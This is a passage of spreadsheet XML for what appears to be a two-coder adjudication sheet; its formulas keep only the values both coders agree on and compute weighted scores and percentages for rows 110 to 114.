        <f>IF(AND(Coder1!Z110&amp;""&lt;&gt;"",Coder1!Z110&amp;""=Coder2!Z110&amp;""),Coder1!Z110,"")</f>
        <v/>
      </c>
      <c r="AA110" s="14">
        <f>IF(AND(Coder1!AA110&amp;""&lt;&gt;"",Coder1!AA110&amp;""=Coder2!AA110&amp;""),Coder1!AA110,"")</f>
        <v/>
      </c>
      <c r="AB110" s="14">
        <f>IF(AND(Coder1!AB110&amp;""&lt;&gt;"",Coder1!AB110&amp;""=Coder2!AB110&amp;""),Coder1!AB110,"")</f>
        <v/>
      </c>
      <c r="AC110" s="14">
        <f>IF(AND(Coder1!AC110&amp;""&lt;&gt;"",Coder1!AC110&amp;""=Coder2!AC110&amp;""),Coder1!AC110,"")</f>
        <v/>
      </c>
      <c r="AD110" s="14">
        <f>IF(AND(Coder1!AD110&amp;""&lt;&gt;"",Coder1!AD110&amp;""=Coder2!AD110&amp;""),Coder1!AD110,"")</f>
        <v/>
      </c>
      <c r="AE110" s="14">
        <f>IF(AND(Coder1!AE110&amp;""&lt;&gt;"",Coder1!AE110&amp;""=Coder2!AE110&amp;""),Coder1!AE110,"")</f>
        <v/>
      </c>
      <c r="AF110" s="14">
        <f>IF(AND(Coder1!AF110&amp;""&lt;&gt;"",Coder1!AF110&amp;""=Coder2!AF110&amp;""),Coder1!AF110,"")</f>
        <v/>
      </c>
      <c r="AG110" s="14">
        <f>IF(AND(Coder1!AG110&amp;""&lt;&gt;"",Coder1!AG110&amp;""=Coder2!AG110&amp;""),Coder1!AG110,"")</f>
        <v/>
      </c>
      <c r="AH110" s="14">
        <f>IF(AND(Coder1!AH110&amp;""&lt;&gt;"",Coder1!AH110&amp;""=Coder2!AH110&amp;""),Coder1!AH110,"")</f>
        <v/>
      </c>
      <c r="AI110" s="11">
        <f>IF(COUNT(E110:L110)=0,"",SUM(E110:L110))</f>
        <v/>
      </c>
      <c r="AJ110" s="11">
        <f>IF(AI110="","",N(E110)*3+N(F110)*2+N(G110)*2+N(H110)*2+N(I110)*2+N(J110)*3+N(K110)*3+N(L110)*3)</f>
        <v/>
      </c>
      <c r="AK110" s="11">
        <f>IF(AI110="","",COUNTIF(N110:AG110,1))</f>
        <v/>
      </c>
      <c r="AL110" s="11">
        <f>IF(OR(AJ110="",AJ110=0),"",ROUND(100*(AJ110-AK110)/AJ110,1))</f>
        <v/>
      </c>
      <c r="AM110" s="11">
        <f>IF(AND(Coder1!AN110=1,Coder2!AN110=1),IF(COUNTBLANK(E110:AH110)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN110" s="11">
        <f>IF(AND(Coder1!AN110=1,Coder2!AN110=1),IF(SUMPRODUCT(--(Coder1!E110:AH110&amp;""&lt;&gt;Coder2!E110:AH110&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO110" s="11" t="n"/>
    </row>
    <row r="111">
      <c r="A111" s="11">
        <f>Coder1!A111</f>
        <v/>
      </c>
      <c r="B111" s="11">
        <f>Coder1!B111</f>
        <v/>
      </c>
      <c r="C111" s="11">
        <f>Coder1!C111</f>
        <v/>
      </c>
      <c r="D111" s="11">
        <f>Coder1!D111</f>
        <v/>
      </c>
      <c r="E111" s="14">
        <f>IF(AND(Coder1!E111&amp;""&lt;&gt;"",Coder1!E111&amp;""=Coder2!E111&amp;""),Coder1!E111,"")</f>
        <v/>
      </c>
      <c r="F111" s="14">
        <f>IF(AND(Coder1!F111&amp;""&lt;&gt;"",Coder1!F111&amp;""=Coder2!F111&amp;""),Coder1!F111,"")</f>
        <v/>
      </c>
      <c r="G111" s="14">
        <f>IF(AND(Coder1!G111&amp;""&lt;&gt;"",Coder1!G111&amp;""=Coder2!G111&amp;""),Coder1!G111,"")</f>
        <v/>
      </c>
      <c r="H111" s="14">
        <f>IF(AND(Coder1!H111&amp;""&lt;&gt;"",Coder1!H111&amp;""=Coder2!H111&amp;""),Coder1!H111,"")</f>
        <v/>
      </c>
      <c r="I111" s="14">
        <f>IF(AND(Coder1!I111&amp;""&lt;&gt;"",Coder1!I111&amp;""=Coder2!I111&amp;""),Coder1!I111,"")</f>
        <v/>
      </c>
      <c r="J111" s="14">
        <f>IF(AND(Coder1!J111&amp;""&lt;&gt;"",Coder1!J111&amp;""=Coder2!J111&amp;""),Coder1!J111,"")</f>
        <v/>
      </c>
      <c r="K111" s="14">
        <f>IF(AND(Coder1!K111&amp;""&lt;&gt;"",Coder1!K111&amp;""=Coder2!K111&amp;""),Coder1!K111,"")</f>
        <v/>
      </c>
      <c r="L111" s="14">
        <f>IF(AND(Coder1!L111&amp;""&lt;&gt;"",Coder1!L111&amp;""=Coder2!L111&amp;""),Coder1!L111,"")</f>
        <v/>
      </c>
      <c r="M111" s="14">
        <f>IF(AND(Coder1!M111&amp;""&lt;&gt;"",Coder1!M111&amp;""=Coder2!M111&amp;""),Coder1!M111,"")</f>
        <v/>
      </c>
      <c r="N111" s="14">
        <f>IF(AND(Coder1!N111&amp;""&lt;&gt;"",Coder1!N111&amp;""=Coder2!N111&amp;""),Coder1!N111,"")</f>
        <v/>
      </c>
      <c r="O111" s="14">
        <f>IF(AND(Coder1!O111&amp;""&lt;&gt;"",Coder1!O111&amp;""=Coder2!O111&amp;""),Coder1!O111,"")</f>
        <v/>
      </c>
      <c r="P111" s="14">
        <f>IF(AND(Coder1!P111&amp;""&lt;&gt;"",Coder1!P111&amp;""=Coder2!P111&amp;""),Coder1!P111,"")</f>
        <v/>
      </c>
      <c r="Q111" s="14">
        <f>IF(AND(Coder1!Q111&amp;""&lt;&gt;"",Coder1!Q111&amp;""=Coder2!Q111&amp;""),Coder1!Q111,"")</f>
        <v/>
      </c>
      <c r="R111" s="14">
        <f>IF(AND(Coder1!R111&amp;""&lt;&gt;"",Coder1!R111&amp;""=Coder2!R111&amp;""),Coder1!R111,"")</f>
        <v/>
      </c>
      <c r="S111" s="14">
        <f>IF(AND(Coder1!S111&amp;""&lt;&gt;"",Coder1!S111&amp;""=Coder2!S111&amp;""),Coder1!S111,"")</f>
        <v/>
      </c>
      <c r="T111" s="14">
        <f>IF(AND(Coder1!T111&amp;""&lt;&gt;"",Coder1!T111&amp;""=Coder2!T111&amp;""),Coder1!T111,"")</f>
        <v/>
      </c>
      <c r="U111" s="14">
        <f>IF(AND(Coder1!U111&amp;""&lt;&gt;"",Coder1!U111&amp;""=Coder2!U111&amp;""),Coder1!U111,"")</f>
        <v/>
      </c>
      <c r="V111" s="14">
        <f>IF(AND(Coder1!V111&amp;""&lt;&gt;"",Coder1!V111&amp;""=Coder2!V111&amp;""),Coder1!V111,"")</f>
        <v/>
      </c>
      <c r="W111" s="14">
        <f>IF(AND(Coder1!W111&amp;""&lt;&gt;"",Coder1!W111&amp;""=Coder2!W111&amp;""),Coder1!W111,"")</f>
        <v/>
      </c>
      <c r="X111" s="14">
        <f>IF(AND(Coder1!X111&amp;""&lt;&gt;"",Coder1!X111&amp;""=Coder2!X111&amp;""),Coder1!X111,"")</f>
        <v/>
      </c>
      <c r="Y111" s="14">
        <f>IF(AND(Coder1!Y111&amp;""&lt;&gt;"",Coder1!Y111&amp;""=Coder2!Y111&amp;""),Coder1!Y111,"")</f>
        <v/>
      </c>
      <c r="Z111" s="14">
        <f>IF(AND(Coder1!Z111&amp;""&lt;&gt;"",Coder1!Z111&amp;""=Coder2!Z111&amp;""),Coder1!Z111,"")</f>
        <v/>
      </c>
      <c r="AA111" s="14">
        <f>IF(AND(Coder1!AA111&amp;""&lt;&gt;"",Coder1!AA111&amp;""=Coder2!AA111&amp;""),Coder1!AA111,"")</f>
        <v/>
      </c>
      <c r="AB111" s="14">
        <f>IF(AND(Coder1!AB111&amp;""&lt;&gt;"",Coder1!AB111&amp;""=Coder2!AB111&amp;""),Coder1!AB111,"")</f>
        <v/>
      </c>
      <c r="AC111" s="14">
        <f>IF(AND(Coder1!AC111&amp;""&lt;&gt;"",Coder1!AC111&amp;""=Coder2!AC111&amp;""),Coder1!AC111,"")</f>
        <v/>
      </c>
      <c r="AD111" s="14">
        <f>IF(AND(Coder1!AD111&amp;""&lt;&gt;"",Coder1!AD111&amp;""=Coder2!AD111&amp;""),Coder1!AD111,"")</f>
        <v/>
      </c>
      <c r="AE111" s="14">
        <f>IF(AND(Coder1!AE111&amp;""&lt;&gt;"",Coder1!AE111&amp;""=Coder2!AE111&amp;""),Coder1!AE111,"")</f>
        <v/>
      </c>
      <c r="AF111" s="14">
        <f>IF(AND(Coder1!AF111&amp;""&lt;&gt;"",Coder1!AF111&amp;""=Coder2!AF111&amp;""),Coder1!AF111,"")</f>
        <v/>
      </c>
      <c r="AG111" s="14">
        <f>IF(AND(Coder1!AG111&amp;""&lt;&gt;"",Coder1!AG111&amp;""=Coder2!AG111&amp;""),Coder1!AG111,"")</f>
        <v/>
      </c>
      <c r="AH111" s="14">
        <f>IF(AND(Coder1!AH111&amp;""&lt;&gt;"",Coder1!AH111&amp;""=Coder2!AH111&amp;""),Coder1!AH111,"")</f>
        <v/>
      </c>
      <c r="AI111" s="11">
        <f>IF(COUNT(E111:L111)=0,"",SUM(E111:L111))</f>
        <v/>
      </c>
      <c r="AJ111" s="11">
        <f>IF(AI111="","",N(E111)*3+N(F111)*2+N(G111)*2+N(H111)*2+N(I111)*2+N(J111)*3+N(K111)*3+N(L111)*3)</f>
        <v/>
      </c>
      <c r="AK111" s="11">
        <f>IF(AI111="","",COUNTIF(N111:AG111,1))</f>
        <v/>
      </c>
      <c r="AL111" s="11">
        <f>IF(OR(AJ111="",AJ111=0),"",ROUND(100*(AJ111-AK111)/AJ111,1))</f>
        <v/>
      </c>
      <c r="AM111" s="11">
        <f>IF(AND(Coder1!AN111=1,Coder2!AN111=1),IF(COUNTBLANK(E111:AH111)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN111" s="11">
        <f>IF(AND(Coder1!AN111=1,Coder2!AN111=1),IF(SUMPRODUCT(--(Coder1!E111:AH111&amp;""&lt;&gt;Coder2!E111:AH111&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO111" s="11" t="n"/>
    </row>
    <row r="112">
      <c r="A112" s="11">
        <f>Coder1!A112</f>
        <v/>
      </c>
      <c r="B112" s="11">
        <f>Coder1!B112</f>
        <v/>
      </c>
      <c r="C112" s="11">
        <f>Coder1!C112</f>
        <v/>
      </c>
      <c r="D112" s="11">
        <f>Coder1!D112</f>
        <v/>
      </c>
      <c r="E112" s="14">
        <f>IF(AND(Coder1!E112&amp;""&lt;&gt;"",Coder1!E112&amp;""=Coder2!E112&amp;""),Coder1!E112,"")</f>
        <v/>
      </c>
      <c r="F112" s="14">
        <f>IF(AND(Coder1!F112&amp;""&lt;&gt;"",Coder1!F112&amp;""=Coder2!F112&amp;""),Coder1!F112,"")</f>
        <v/>
      </c>
      <c r="G112" s="14">
        <f>IF(AND(Coder1!G112&amp;""&lt;&gt;"",Coder1!G112&amp;""=Coder2!G112&amp;""),Coder1!G112,"")</f>
        <v/>
      </c>
      <c r="H112" s="14">
        <f>IF(AND(Coder1!H112&amp;""&lt;&gt;"",Coder1!H112&amp;""=Coder2!H112&amp;""),Coder1!H112,"")</f>
        <v/>
      </c>
      <c r="I112" s="14">
        <f>IF(AND(Coder1!I112&amp;""&lt;&gt;"",Coder1!I112&amp;""=Coder2!I112&amp;""),Coder1!I112,"")</f>
        <v/>
      </c>
      <c r="J112" s="14">
        <f>IF(AND(Coder1!J112&amp;""&lt;&gt;"",Coder1!J112&amp;""=Coder2!J112&amp;""),Coder1!J112,"")</f>
        <v/>
      </c>
      <c r="K112" s="14">
        <f>IF(AND(Coder1!K112&amp;""&lt;&gt;"",Coder1!K112&amp;""=Coder2!K112&amp;""),Coder1!K112,"")</f>
        <v/>
      </c>
      <c r="L112" s="14">
        <f>IF(AND(Coder1!L112&amp;""&lt;&gt;"",Coder1!L112&amp;""=Coder2!L112&amp;""),Coder1!L112,"")</f>
        <v/>
      </c>
      <c r="M112" s="14">
        <f>IF(AND(Coder1!M112&amp;""&lt;&gt;"",Coder1!M112&amp;""=Coder2!M112&amp;""),Coder1!M112,"")</f>
        <v/>
      </c>
      <c r="N112" s="14">
        <f>IF(AND(Coder1!N112&amp;""&lt;&gt;"",Coder1!N112&amp;""=Coder2!N112&amp;""),Coder1!N112,"")</f>
        <v/>
      </c>
      <c r="O112" s="14">
        <f>IF(AND(Coder1!O112&amp;""&lt;&gt;"",Coder1!O112&amp;""=Coder2!O112&amp;""),Coder1!O112,"")</f>
        <v/>
      </c>
      <c r="P112" s="14">
        <f>IF(AND(Coder1!P112&amp;""&lt;&gt;"",Coder1!P112&amp;""=Coder2!P112&amp;""),Coder1!P112,"")</f>
        <v/>
      </c>
      <c r="Q112" s="14">
        <f>IF(AND(Coder1!Q112&amp;""&lt;&gt;"",Coder1!Q112&amp;""=Coder2!Q112&amp;""),Coder1!Q112,"")</f>
        <v/>
      </c>
      <c r="R112" s="14">
        <f>IF(AND(Coder1!R112&amp;""&lt;&gt;"",Coder1!R112&amp;""=Coder2!R112&amp;""),Coder1!R112,"")</f>
        <v/>
      </c>
      <c r="S112" s="14">
        <f>IF(AND(Coder1!S112&amp;""&lt;&gt;"",Coder1!S112&amp;""=Coder2!S112&amp;""),Coder1!S112,"")</f>
        <v/>
      </c>
      <c r="T112" s="14">
        <f>IF(AND(Coder1!T112&amp;""&lt;&gt;"",Coder1!T112&amp;""=Coder2!T112&amp;""),Coder1!T112,"")</f>
        <v/>
      </c>
      <c r="U112" s="14">
        <f>IF(AND(Coder1!U112&amp;""&lt;&gt;"",Coder1!U112&amp;""=Coder2!U112&amp;""),Coder1!U112,"")</f>
        <v/>
      </c>
      <c r="V112" s="14">
        <f>IF(AND(Coder1!V112&amp;""&lt;&gt;"",Coder1!V112&amp;""=Coder2!V112&amp;""),Coder1!V112,"")</f>
        <v/>
      </c>
      <c r="W112" s="14">
        <f>IF(AND(Coder1!W112&amp;""&lt;&gt;"",Coder1!W112&amp;""=Coder2!W112&amp;""),Coder1!W112,"")</f>
        <v/>
      </c>
      <c r="X112" s="14">
        <f>IF(AND(Coder1!X112&amp;""&lt;&gt;"",Coder1!X112&amp;""=Coder2!X112&amp;""),Coder1!X112,"")</f>
        <v/>
      </c>
      <c r="Y112" s="14">
        <f>IF(AND(Coder1!Y112&amp;""&lt;&gt;"",Coder1!Y112&amp;""=Coder2!Y112&amp;""),Coder1!Y112,"")</f>
        <v/>
      </c>
      <c r="Z112" s="14">
        <f>IF(AND(Coder1!Z112&amp;""&lt;&gt;"",Coder1!Z112&amp;""=Coder2!Z112&amp;""),Coder1!Z112,"")</f>
        <v/>
      </c>
      <c r="AA112" s="14">
        <f>IF(AND(Coder1!AA112&amp;""&lt;&gt;"",Coder1!AA112&amp;""=Coder2!AA112&amp;""),Coder1!AA112,"")</f>
        <v/>
      </c>
      <c r="AB112" s="14">
        <f>IF(AND(Coder1!AB112&amp;""&lt;&gt;"",Coder1!AB112&amp;""=Coder2!AB112&amp;""),Coder1!AB112,"")</f>
        <v/>
      </c>
      <c r="AC112" s="14">
        <f>IF(AND(Coder1!AC112&amp;""&lt;&gt;"",Coder1!AC112&amp;""=Coder2!AC112&amp;""),Coder1!AC112,"")</f>
        <v/>
      </c>
      <c r="AD112" s="14">
        <f>IF(AND(Coder1!AD112&amp;""&lt;&gt;"",Coder1!AD112&amp;""=Coder2!AD112&amp;""),Coder1!AD112,"")</f>
        <v/>
      </c>
      <c r="AE112" s="14">
        <f>IF(AND(Coder1!AE112&amp;""&lt;&gt;"",Coder1!AE112&amp;""=Coder2!AE112&amp;""),Coder1!AE112,"")</f>
        <v/>
      </c>
      <c r="AF112" s="14">
        <f>IF(AND(Coder1!AF112&amp;""&lt;&gt;"",Coder1!AF112&amp;""=Coder2!AF112&amp;""),Coder1!AF112,"")</f>
        <v/>
      </c>
      <c r="AG112" s="14">
        <f>IF(AND(Coder1!AG112&amp;""&lt;&gt;"",Coder1!AG112&amp;""=Coder2!AG112&amp;""),Coder1!AG112,"")</f>
        <v/>
      </c>
      <c r="AH112" s="14">
        <f>IF(AND(Coder1!AH112&amp;""&lt;&gt;"",Coder1!AH112&amp;""=Coder2!AH112&amp;""),Coder1!AH112,"")</f>
        <v/>
      </c>
      <c r="AI112" s="11">
        <f>IF(COUNT(E112:L112)=0,"",SUM(E112:L112))</f>
        <v/>
      </c>
      <c r="AJ112" s="11">
        <f>IF(AI112="","",N(E112)*3+N(F112)*2+N(G112)*2+N(H112)*2+N(I112)*2+N(J112)*3+N(K112)*3+N(L112)*3)</f>
        <v/>
      </c>
      <c r="AK112" s="11">
        <f>IF(AI112="","",COUNTIF(N112:AG112,1))</f>
        <v/>
      </c>
      <c r="AL112" s="11">
        <f>IF(OR(AJ112="",AJ112=0),"",ROUND(100*(AJ112-AK112)/AJ112,1))</f>
        <v/>
      </c>
      <c r="AM112" s="11">
        <f>IF(AND(Coder1!AN112=1,Coder2!AN112=1),IF(COUNTBLANK(E112:AH112)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN112" s="11">
        <f>IF(AND(Coder1!AN112=1,Coder2!AN112=1),IF(SUMPRODUCT(--(Coder1!E112:AH112&amp;""&lt;&gt;Coder2!E112:AH112&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO112" s="11" t="n"/>
    </row>
    <row r="113">
      <c r="A113" s="11">
        <f>Coder1!A113</f>
        <v/>
      </c>
      <c r="B113" s="11">
        <f>Coder1!B113</f>
        <v/>
      </c>
      <c r="C113" s="11">
        <f>Coder1!C113</f>
        <v/>
      </c>
      <c r="D113" s="11">
        <f>Coder1!D113</f>
        <v/>
      </c>
      <c r="E113" s="14">
        <f>IF(AND(Coder1!E113&amp;""&lt;&gt;"",Coder1!E113&amp;""=Coder2!E113&amp;""),Coder1!E113,"")</f>
        <v/>
      </c>
      <c r="F113" s="14">
        <f>IF(AND(Coder1!F113&amp;""&lt;&gt;"",Coder1!F113&amp;""=Coder2!F113&amp;""),Coder1!F113,"")</f>
        <v/>
      </c>
      <c r="G113" s="14">
        <f>IF(AND(Coder1!G113&amp;""&lt;&gt;"",Coder1!G113&amp;""=Coder2!G113&amp;""),Coder1!G113,"")</f>
        <v/>
      </c>
      <c r="H113" s="14">
        <f>IF(AND(Coder1!H113&amp;""&lt;&gt;"",Coder1!H113&amp;""=Coder2!H113&amp;""),Coder1!H113,"")</f>
        <v/>
      </c>
      <c r="I113" s="14">
        <f>IF(AND(Coder1!I113&amp;""&lt;&gt;"",Coder1!I113&amp;""=Coder2!I113&amp;""),Coder1!I113,"")</f>
        <v/>
      </c>
      <c r="J113" s="14">
        <f>IF(AND(Coder1!J113&amp;""&lt;&gt;"",Coder1!J113&amp;""=Coder2!J113&amp;""),Coder1!J113,"")</f>
        <v/>
      </c>
      <c r="K113" s="14">
        <f>IF(AND(Coder1!K113&amp;""&lt;&gt;"",Coder1!K113&amp;""=Coder2!K113&amp;""),Coder1!K113,"")</f>
        <v/>
      </c>
      <c r="L113" s="14">
        <f>IF(AND(Coder1!L113&amp;""&lt;&gt;"",Coder1!L113&amp;""=Coder2!L113&amp;""),Coder1!L113,"")</f>
        <v/>
      </c>
      <c r="M113" s="14">
        <f>IF(AND(Coder1!M113&amp;""&lt;&gt;"",Coder1!M113&amp;""=Coder2!M113&amp;""),Coder1!M113,"")</f>
        <v/>
      </c>
      <c r="N113" s="14">
        <f>IF(AND(Coder1!N113&amp;""&lt;&gt;"",Coder1!N113&amp;""=Coder2!N113&amp;""),Coder1!N113,"")</f>
        <v/>
      </c>
      <c r="O113" s="14">
        <f>IF(AND(Coder1!O113&amp;""&lt;&gt;"",Coder1!O113&amp;""=Coder2!O113&amp;""),Coder1!O113,"")</f>
        <v/>
      </c>
      <c r="P113" s="14">
        <f>IF(AND(Coder1!P113&amp;""&lt;&gt;"",Coder1!P113&amp;""=Coder2!P113&amp;""),Coder1!P113,"")</f>
        <v/>
      </c>
      <c r="Q113" s="14">
        <f>IF(AND(Coder1!Q113&amp;""&lt;&gt;"",Coder1!Q113&amp;""=Coder2!Q113&amp;""),Coder1!Q113,"")</f>
        <v/>
      </c>
      <c r="R113" s="14">
        <f>IF(AND(Coder1!R113&amp;""&lt;&gt;"",Coder1!R113&amp;""=Coder2!R113&amp;""),Coder1!R113,"")</f>
        <v/>
      </c>
      <c r="S113" s="14">
        <f>IF(AND(Coder1!S113&amp;""&lt;&gt;"",Coder1!S113&amp;""=Coder2!S113&amp;""),Coder1!S113,"")</f>
        <v/>
      </c>
      <c r="T113" s="14">
        <f>IF(AND(Coder1!T113&amp;""&lt;&gt;"",Coder1!T113&amp;""=Coder2!T113&amp;""),Coder1!T113,"")</f>
        <v/>
      </c>
      <c r="U113" s="14">
        <f>IF(AND(Coder1!U113&amp;""&lt;&gt;"",Coder1!U113&amp;""=Coder2!U113&amp;""),Coder1!U113,"")</f>
        <v/>
      </c>
      <c r="V113" s="14">
        <f>IF(AND(Coder1!V113&amp;""&lt;&gt;"",Coder1!V113&amp;""=Coder2!V113&amp;""),Coder1!V113,"")</f>
        <v/>
      </c>
      <c r="W113" s="14">
        <f>IF(AND(Coder1!W113&amp;""&lt;&gt;"",Coder1!W113&amp;""=Coder2!W113&amp;""),Coder1!W113,"")</f>
        <v/>
      </c>
      <c r="X113" s="14">
        <f>IF(AND(Coder1!X113&amp;""&lt;&gt;"",Coder1!X113&amp;""=Coder2!X113&amp;""),Coder1!X113,"")</f>
        <v/>
      </c>
      <c r="Y113" s="14">
        <f>IF(AND(Coder1!Y113&amp;""&lt;&gt;"",Coder1!Y113&amp;""=Coder2!Y113&amp;""),Coder1!Y113,"")</f>
        <v/>
      </c>
      <c r="Z113" s="14">
        <f>IF(AND(Coder1!Z113&amp;""&lt;&gt;"",Coder1!Z113&amp;""=Coder2!Z113&amp;""),Coder1!Z113,"")</f>
        <v/>
      </c>
      <c r="AA113" s="14">
        <f>IF(AND(Coder1!AA113&amp;""&lt;&gt;"",Coder1!AA113&amp;""=Coder2!AA113&amp;""),Coder1!AA113,"")</f>
        <v/>
      </c>
      <c r="AB113" s="14">
        <f>IF(AND(Coder1!AB113&amp;""&lt;&gt;"",Coder1!AB113&amp;""=Coder2!AB113&amp;""),Coder1!AB113,"")</f>
        <v/>
      </c>
      <c r="AC113" s="14">
        <f>IF(AND(Coder1!AC113&amp;""&lt;&gt;"",Coder1!AC113&amp;""=Coder2!AC113&amp;""),Coder1!AC113,"")</f>
        <v/>
      </c>
      <c r="AD113" s="14">
        <f>IF(AND(Coder1!AD113&amp;""&lt;&gt;"",Coder1!AD113&amp;""=Coder2!AD113&amp;""),Coder1!AD113,"")</f>
        <v/>
      </c>
      <c r="AE113" s="14">
        <f>IF(AND(Coder1!AE113&amp;""&lt;&gt;"",Coder1!AE113&amp;""=Coder2!AE113&amp;""),Coder1!AE113,"")</f>
        <v/>
      </c>
      <c r="AF113" s="14">
        <f>IF(AND(Coder1!AF113&amp;""&lt;&gt;"",Coder1!AF113&amp;""=Coder2!AF113&amp;""),Coder1!AF113,"")</f>
        <v/>
      </c>
      <c r="AG113" s="14">
        <f>IF(AND(Coder1!AG113&amp;""&lt;&gt;"",Coder1!AG113&amp;""=Coder2!AG113&amp;""),Coder1!AG113,"")</f>
        <v/>
      </c>
      <c r="AH113" s="14">
        <f>IF(AND(Coder1!AH113&amp;""&lt;&gt;"",Coder1!AH113&amp;""=Coder2!AH113&amp;""),Coder1!AH113,"")</f>
        <v/>
      </c>
      <c r="AI113" s="11">
        <f>IF(COUNT(E113:L113)=0,"",SUM(E113:L113))</f>
        <v/>
      </c>
      <c r="AJ113" s="11">
        <f>IF(AI113="","",N(E113)*3+N(F113)*2+N(G113)*2+N(H113)*2+N(I113)*2+N(J113)*3+N(K113)*3+N(L113)*3)</f>
        <v/>
      </c>
      <c r="AK113" s="11">
        <f>IF(AI113="","",COUNTIF(N113:AG113,1))</f>
        <v/>
      </c>
      <c r="AL113" s="11">
        <f>IF(OR(AJ113="",AJ113=0),"",ROUND(100*(AJ113-AK113)/AJ113,1))</f>
        <v/>
      </c>
      <c r="AM113" s="11">
        <f>IF(AND(Coder1!AN113=1,Coder2!AN113=1),IF(COUNTBLANK(E113:AH113)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN113" s="11">
        <f>IF(AND(Coder1!AN113=1,Coder2!AN113=1),IF(SUMPRODUCT(--(Coder1!E113:AH113&amp;""&lt;&gt;Coder2!E113:AH113&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO113" s="11" t="n"/>
    </row>
    <row r="114">
      <c r="A114" s="11">
        <f>Coder1!A114</f>
        <v/>
      </c>
      <c r="B114" s="11">
        <f>Coder1!B114</f>
        <v/>
      </c>
      <c r="C114" s="11">
        <f>Coder1!C114</f>
        <v/>
      </c>
      <c r="D114" s="11">
        <f>Coder1!D114</f>
        <v/>
      </c>
      <c r="E114" s="14">
        <f>IF(AND(Coder1!E114&amp;""&lt;&gt;"",Coder1!E114&amp;""=Coder2!E114&amp;""),Coder1!E114,"")</f>
        <v/>
      </c>
      <c r="F114" s="14">
        <f>IF(AND(Coder1!F114&amp;""&lt;&gt;"",Coder1!F114&amp;""=Coder2!F114&amp;""),Coder1!F114,"")</f>
        <v/>
      </c>
      <c r="G114" s="14">
        <f>IF(AND(Coder1!G114&amp;""&lt;&gt;"",Coder1!G114&amp;""=Coder2!G114&amp;""),Coder1!G114,"")</f>
        <v/>
      </c>
      <c r="H114" s="14">
        <f>IF(AND(Coder1!H114&amp;""&lt;&gt;"",Coder1!H114&amp;""=Coder2!H114&amp;""),Coder1!H114,"")</f>
        <v/>
      </c>
      <c r="I114" s="14">
        <f>IF(AND(Coder1!I114&amp;""&lt;&gt;"",Coder1!I114&amp;""=Coder2!I114&amp;""),Coder1!I114,"")</f>
        <v/>
      </c>
      <c r="J114" s="14">
        <f>IF(AND(Coder1!J114&amp;""&lt;&gt;"",Coder1!J114&amp;""=Coder2!J114&amp;""),Coder1!J114,"")</f>
        <v/>
      </c>
      <c r="K114" s="14">
        <f>IF(AND(Coder1!K114&amp;""&lt;&gt;"",Coder1!K114&amp;""=Coder2!K114&amp;""),Coder1!K114,"")</f>
        <v/>
      </c>
      <c r="L114" s="14">
        <f>IF(AND(Coder1!L114&amp;""&lt;&gt;"",Coder1!L114&amp;""=Coder2!L114&amp;""),Coder1!L114,"")</f>
        <v/>
      </c>
      <c r="M114" s="14">
        <f>IF(AND(Coder1!M114&amp;""&lt;&gt;"",Coder1!M114&amp;""=Coder2!M114&amp;""),Coder1!M114,"")</f>
        <v/>
      </c>
      <c r="N114" s="14">
        <f>IF(AND(Coder1!N114&amp;""&lt;&gt;"",Coder1!N114&amp;""=Coder2!N114&amp;""),Coder1!N114,"")</f>
        <v/>
      </c>
      <c r="O114" s="14">
        <f>IF(AND(Coder1!O114&amp;""&lt;&gt;"",Coder1!O114&amp;""=Coder2!O114&amp;""),Coder1!O114,"")</f>
        <v/>
      </c>
      <c r="P114" s="14">
        <f>IF(AND(Coder1!P114&amp;""&lt;&gt;"",Coder1!P114&amp;""=Coder2!P114&amp;""),Coder1!P114,"")</f>
        <v/>
      </c>
      <c r="Q114" s="14">
        <f>IF(AND(Coder1!Q114&amp;""&lt;&gt;"",Coder1!Q114&amp;""=Coder2!Q114&amp;""),Coder1!Q114,"")</f>
        <v/>
      </c>
      <c r="R114" s="14">
        <f>IF(AND(Coder1!R114&amp;""&lt;&gt;"",Coder1!R114&amp;""=Coder2!R114&amp;""),Coder1!R114,"")</f>
        <v/>
      </c>
      <c r="S114" s="14">
        <f>IF(AND(Coder1!S114&amp;""&lt;&gt;"",Coder1!S114&amp;""=Coder2!S114&amp;""),Coder1!S114,"")</f>
        <v/>
      </c>
      <c r="T114" s="14">
        <f>IF(AND(Coder1!T114&amp;""&lt;&gt;"",Coder1!T114&amp;""=Coder2!T114&amp;""),Coder1!T114,"")</f>
        <v/>
      </c>
      <c r="U114" s="14">
        <f>IF(AND(Coder1!U114&amp;""&lt;&gt;"",Coder1!U114&amp;""=Coder2!U114&amp;""),Coder1!U114,"")</f>
        <v/>
      </c>
      <c r="V114" s="14">
        <f>IF(AND(Coder1!V114&amp;""&lt;&gt;"",Coder1!V114&amp;""=Coder2!V114&amp;""),Coder1!V114,"")</f>
        <v/>
      </c>
      <c r="W114" s="14">
        <f>IF(AND(Coder1!W114&amp;""&lt;&gt;"",Coder1!W114&amp;""=Coder2!W114&amp;""),Coder1!W114,"")</f>
        <v/>
      </c>
      <c r="X114" s="14">
        <f>IF(AND(Coder1!X114&amp;""&lt;&gt;"",Coder1!X114&amp;""=Coder2!X114&amp;""),Coder1!X114,"")</f>
        <v/>
      </c>
      <c r="Y114" s="14">
        <f>IF(AND(Coder1!Y114&amp;""&lt;&gt;"",Coder1!Y114&amp;""=Coder2!Y114&amp;""),Coder1!Y114,"")</f>
        <v/>
      </c>
      <c r="Z114" s="14">
        <f>IF(AND(Coder1!Z114&amp;""&lt;&gt;"",Coder1!Z114&amp;""=Coder2!Z114&amp;""),Coder1!Z114,"")</f>
        <v/>
      </c>
      <c r="AA114" s="14">
        <f>IF(AND(Coder1!AA114&amp;""&lt;&gt;"",Coder1!AA114&amp;""=Coder2!AA114&amp;""),Coder1!AA114,"")</f>
        <v/>
      </c>
      <c r="AB114" s="14">
        <f>IF(AND(Coder1!AB114&amp;""&lt;&gt;"",Coder1!AB114&amp;""=Coder2!AB114&amp;""),Coder1!AB114,"")</f>
        <v/>
      </c>
      <c r="AC114" s="14">
